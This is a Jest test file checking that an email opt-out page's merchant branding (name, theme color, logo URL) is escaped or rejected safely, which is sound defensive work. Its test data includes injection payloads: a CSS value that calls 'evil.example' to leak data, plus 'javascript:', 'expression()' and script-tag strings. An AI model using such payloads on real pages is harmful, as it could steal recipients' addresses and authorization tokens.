/**
 * @jest-environment node
 *
 * Must stay the FIRST block comment in the file — Jest reads the pragma only
 * from the opening docblock, so a license header above it silently leaves the
 * suite on jsdom.
 *
 * @license
 * Copyright 2026 Aglyn LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * THE SENDING SITE'S IDENTITY ON THE OPT-OUT PAGE, and the four things it may
 * not cost.
 *
 * The shell is reached from a merchant's campaign by a recipient who may not
 * trust the sender, with no session and no stylesheet. Painting it with
 * merchant-controlled data buys the recipient a page they recognize, and it
 * puts three merchant-editable values — a name, a logo URL and a theme color
 * — inside an HTML attribute. The suite is organized around what that must
 * never become:
 *
 *  1. A theme color cannot escape its `style` attribute. The value lands in
 *     `style="…"` on a page whose own URL carries the recipient's address and
 *     the HMAC that authorizes acting on it, so a color that closes the
 *     declaration is an exfiltration primitive, not a rendering bug.
 *  2. A logo cannot become a script or an inline payload.
 *  3. A brand cannot make the page unreadable. This is the screen somebody
 *     uses to stop the mail; if the button is invisible, the opt-out has
 *     failed and that is a compliance failure rather than a cosmetic one.
 *  4. The absent case still renders a complete, correctly-named page — which
 *     is also the self-host case, so it is the path an operator runs daily
 *     rather than a branch reached only when something is broken.
 */

import {
  PAL,
  PLATFORM_EMAIL_BRAND,
  page,
  resolveEmailPageBrand,
  submitButton,
} from './unsubscribe-link'

const themed = (light: Record<string, unknown>) => ({
  displayName: 'Acme Bakery',
  cname: 'acmebakery.com',
  theme: { colorSchemes: { light } },
})

describe('resolveEmailPageBrand — the name', () => {
  it('prefers the SEO entity name, then the display name', () => {
    expect(
      resolveEmailPageBrand({
        displayName: 'acme-bakery',
        seo: { entity: { name: 'Acme Bakery' } },
      }).name,
    ).toBe('Acme Bakery')
    expect(resolveEmailPageBrand({ displayName: 'Acme Bakery' }).name).toBe(
      'Acme Bakery',
    )
  })

  it('falls back to the deployment brand for a host that names nothing', () => {
    expect(resolveEmailPageBrand({}).name).toBe(PLATFORM_EMAIL_BRAND.name)
    expect(resolveEmailPageBrand(null).name).toBe(PLATFORM_EMAIL_BRAND.name)
  })

  it('caps a hostile name so it cannot become the whole page', () => {
    const brand = resolveEmailPageBrand({ displayName: 'Ha'.repeat(500) })
    expect(brand.name.length).toBeLessThanOrEqual(60)
  })

  it('escapes a name carrying markup', () => {
    const html = page('body', 420, resolveEmailPageBrand({ displayName: '<script>x</script>' }))
    expect(html).not.toContain('<script>')
    expect(html).toContain('&lt;script&gt;')
  })
})

describe('resolveEmailPageBrand — colors cannot escape the style attribute', () => {
  it.each([
    ['a closed declaration', 'red;background:url(https://evil.example/steal?q='],
    ['a bare keyword', 'red'],
    ['a css function', 'rgb(255,0,0)'],
    ['a custom property', 'var(--x)'],
    ['an expression', 'expression(alert(1))'],
    ['an empty string', ''],
    ['a non-string', 42],
  ])('refuses %s and keeps the default fill', (_label, value) => {
    const brand = resolveEmailPageBrand(themed({ primary: { main: value } }))
    expect(brand.pal.brand).toBe(PAL.brand)
    expect(page('body', 420, brand)).not.toContain('url(https://evil')
  })

  it('accepts every hex form a theme editor can write', () => {
    for (const hex of ['#abc', '#abcd', '#8A4B2A', '#8A4B2AFF']) {
      expect(resolveEmailPageBrand(themed({ primary: { main: hex } })).pal.brand).toBe(hex)
    }
  })

  it('reads the LIGHT scheme, because the card is painted light', () => {
    const brand = resolveEmailPageBrand({
      displayName: 'Acme',
      theme: {
        colorSchemes: {
          light: { primary: { main: '#8A4B2A' } },
          dark: { primary: { main: '#000000' } },
        },
      },
    })
    expect(brand.pal.brand).toBe('#8A4B2A')
  })

  it('leaves the legibility neutrals alone whatever the theme says', () => {
    const brand = resolveEmailPageBrand(
      themed({
        primary: { main: '#FFFFFF' },
        background: { default: '#FFFFFF', paper: '#FFFFFF' },
        text: { primary: '#FFFFFF', secondary: '#FFFFFF' },
        divider: '#FFFFFF',
      }),
    )
    expect(brand.pal.cardBg).toBe(PAL.cardBg)
    expect(brand.pal.pageBg).toBe(PAL.pageBg)
    expect(brand.pal.ink).toBe(PAL.ink)
    expect(brand.pal.muted).toBe(PAL.muted)
    expect(brand.pal.divider).toBe(PAL.divider)
  })

  it('keeps the platform accent when a host themed nothing, and takes the host primary when it themed only that', () => {
    expect(resolveEmailPageBrand({ displayName: 'Plain' }).pal.accentRule).toBe(PAL.accentRule)
    expect(
      resolveEmailPageBrand(themed({ primary: { main: '#8A4B2A' } })).pal.accentRule,
    ).toBe('#8A4B2A')
    expect(
      resolveEmailPageBrand(
        themed({ primary: { main: '#8A4B2A' }, secondary: { main: '#E8B04B' } }),
      ).pal.accentRule,
    ).toBe('#E8B04B')
  })
})

describe('the button stays readable on a merchant-chosen fill', () => {
  it('uses light ink on a dark brand and dark ink on a pale one', () => {
    const dark = resolveEmailPageBrand(themed({ primary: { main: '#8A4B2A' } }))
    const pale = resolveEmailPageBrand(themed({ primary: { main: '#FFF176' } }))
    expect(dark.pal.onBrand).toBe(PAL.onBrand)
    expect(pale.pal.onBrand).toBe(PAL.ink)
    expect(submitButton('Save', { pal: pale.pal })).toContain(`color:${PAL.ink}`)
    expect(submitButton('Save', { pal: dark.pal })).toContain(`color:${PAL.onBrand}`)
  })

  it('handles the short hex forms without misreading the luminance', () => {
    expect(resolveEmailPageBrand(themed({ primary: { main: '#fff' } })).pal.onBrand).toBe(PAL.ink)
    expect(resolveEmailPageBrand(themed({ primary: { main: '#000' } })).pal.onBrand).toBe(PAL.onBrand)
  })
})

describe('the logo', () => {
  it('resolves a `media:` reference against the site origin', () => {
    const brand = resolveEmailPageBrand({
      $id: 'host-1',
      displayName: 'Acme',
      cname: 'acmebakery.com',
      logoUrl: 'media:host/abc123',
    })
    expect(brand.logoUrl).toBe('https://acmebakery.com/api/media/cdn/host/abc123')
  })

  it.each([
    ['javascript:', 'javascript:alert(1)'],
    ['a data payload', 'data:image/svg+xml;base64,AAAA'],
    ['plain http', 'http://acmebakery.com/logo.png'],
  ])('refuses %s and falls back to the wordmark', (_label, logoUrl) => {
    const brand = resolveEmailPageBrand({ $id: 'host-1', displayName: 'Acme', cname: 'acmebakery.com', logoUrl })
    expect(brand.logoUrl).toBeUndefined()
    const html = page('body', 420, brand)
    expect(html).not.toContain('<img')
    expect(html).toContain('Acme')
  })

  it('yields nothing for a relative reference with no origin to resolve against', () => {
    expect(resolveEmailPageBrand({ displayName: 'Acme', logoUrl: 'media:host/abc' }).logoUrl).toBeUndefined()
  })

  it('carries the business name as `alt`, so a logo that fails degrades to the wordmark', () => {
    const html = page(
      'body',
      420,
      resolveEmailPageBrand({ $id: 'h', displayName: 'Acme Bakery', cname: 'acmebakery.com', logoUrl: 'media:host/abc' }),
    )
    expect(html).toContain('alt="Acme Bakery"')
    // The page's URL carries the recipient's address and its HMAC; the logo is
    // a third-party request and must not be handed that link.
    expect(html).toContain('referrerpolicy="no-referrer"')
  })
})

describe('the shell', () => {
  it('declares its charset in the document, not only in the header', () => {
    expect(page('body')).toContain('<meta charset="utf-8">')
  })

  it('withholds the referrer, because the URL carries the address and the HMAC', () => {
    expect(page('body')).toContain('<meta name="referrer" content="no-referrer">')
  })

  it('names the sending site in the title, and the deployment when there is none', () => {
    expect(page('body', 420, resolveEmailPageBrand(themed({}))).includes('<title>Acme Bakery</title>')).toBe(true)
    expect(page('body')).toContain(`<title>${PLATFORM_EMAIL_BRAND.name}</title>`)
  })

  it('renders a complete page with no brand at all — the self-host path', () => {
    const html = page('<p>body</p>')
    expect(html).toContain('<!doctype html>')
    expect(html).toContain(PLATFORM_EMAIL_BRAND.name)
    expect(html).toContain('<p>body</p>')
    expect(html.endsWith('</div></div>')).toBe(true)
  })
})
